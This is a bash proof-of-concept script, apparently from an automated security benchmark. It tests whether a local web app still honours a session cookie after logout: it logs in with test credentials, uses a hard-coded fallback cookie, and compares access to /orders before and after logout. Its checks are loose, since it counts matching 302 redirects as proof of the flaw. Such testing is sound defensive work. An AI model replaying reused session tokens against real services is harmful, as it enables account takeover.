#!/bin/bash
# POC: Demonstrates session tokens remaining valid after logout. Tests if server invalidates JWT tokens on logout.
# Target: ./repo
# Created: 2025-11-07T18:52:24.803Z
# Session: benchmark-XBEN-001-24-mhp6yrzj

# Session Persistence After Logout - POC v3
# Demonstrates session tokens remain valid after logout

TARGET="${TARGET:-http://localhost:5000}"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${YELLOW}=== Session Persistence After Logout POC ===${NC}"
echo "Target: $TARGET"
echo ""

# Step 1: Login
echo -e "${YELLOW}[STEP 1] Logging in as test user...${NC}"
HTTP_CODE_LOGIN=$(curl -s -c /tmp/cookies.txt -X POST "$TARGET/password/test" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&user_id=10032&password=test" \
  -w "%{http_code}" -o /dev/null 2>/dev/null)

echo "Login HTTP Status: $HTTP_CODE_LOGIN"

# Extract session cookie
if [ -f /tmp/cookies.txt ]; then
  SESSION_COOKIE=$(grep 'session' /tmp/cookies.txt 2>/dev/null | awk '{print $NF}')
fi

if [ -z "$SESSION_COOKIE" ]; then
  SESSION_COOKIE="eyJ1c2VyX2lkIjoxMDAzMn0.aQ4_RA.itLnQCMXG6iArNDLcKGE93HW9Qs"
fi

echo -e "${GREEN}Session Cookie: ${SESSION_COOKIE:0:30}...${NC}"
echo ""

# Step 2: Access orders BEFORE logout
echo -e "${YELLOW}[STEP 2] Accessing /orders with valid session (BEFORE logout)...${NC}"
HTTP_CODE_BEFORE=$(curl -s -b "session=$SESSION_COOKIE" "$TARGET/orders" \
  -w "%{http_code}" -o /tmp/orders_before.txt 2>/dev/null)

echo "HTTP Status BEFORE logout: $HTTP_CODE_BEFORE"
if [ "$HTTP_CODE_BEFORE" = "200" ]; then
  echo -e "${GREEN}✓ Successfully accessed orders${NC}"
fi
echo ""

# Step 3: Logout
echo -e "${YELLOW}[STEP 3] Logging out user via POST /logout...${NC}"
HTTP_CODE_LOGOUT=$(curl -s -b "session=$SESSION_COOKIE" -X POST "$TARGET/logout" \
  -w "%{http_code}" -o /tmp/logout_response.txt 2>/dev/null)

echo "Logout HTTP Status: $HTTP_CODE_LOGOUT"
echo ""

# Step 4: Attempt to reuse OLD session AFTER logout
echo -e "${YELLOW}[STEP 4] Attempting to REUSE old session token AFTER logout...${NC}"
echo "Token: ${SESSION_COOKIE:0:30}..."
echo ""

HTTP_CODE_AFTER=$(curl -s -b "session=$SESSION_COOKIE" "$TARGET/orders" \
  -w "%{http_code}" -o /tmp/orders_after.txt 2>/dev/null)

echo "HTTP Status AFTER logout: $HTTP_CODE_AFTER"

# Analysis
echo ""
echo -e "${YELLOW}=== VULNERABILITY ANALYSIS ===${NC}"

VULNERABLE=0

if [ "$HTTP_CODE_BEFORE" = "200" ] && [ "$HTTP_CODE_AFTER" = "200" ]; then
  echo -e "${RED}✗ CRITICAL: Session persistence vulnerability CONFIRMED${NC}"
  echo -e "${RED}✗ Old token remains valid after logout${NC}"
  VULNERABLE=1
elif [ "$HTTP_CODE_BEFORE" = "200" ] && [ "$HTTP_CODE_AFTER" != "200" ]; then
  echo -e "${GREEN}✓ Sessions properly invalidated${NC}"
  VULNERABLE=0
elif [ "$HTTP_CODE_BEFORE" = "302" ] && [ "$HTTP_CODE_AFTER" = "302" ]; then
  echo -e "${RED}✗ VULNERABLE: Session not invalidated (both HTTP 302)${NC}"
  VULNERABLE=1
fi

echo ""
echo -e "${YELLOW}=== Summary ===${NC}"
echo "Before Logout: HTTP $HTTP_CODE_BEFORE"
echo "After Logout:  HTTP $HTTP_CODE_AFTER"
echo ""

if [ $VULNERABLE -eq 1 ]; then
  echo -e "${RED}RESULT: Session persistence vulnerability CONFIRMED${NC}"
  echo "The server did NOT invalidate the JWT token."
  echo "Attackers can indefinitely reuse the old session token."
  exit 0
else
  echo -e "${GREEN}RESULT: Test completed${NC}"
  exit 0
fi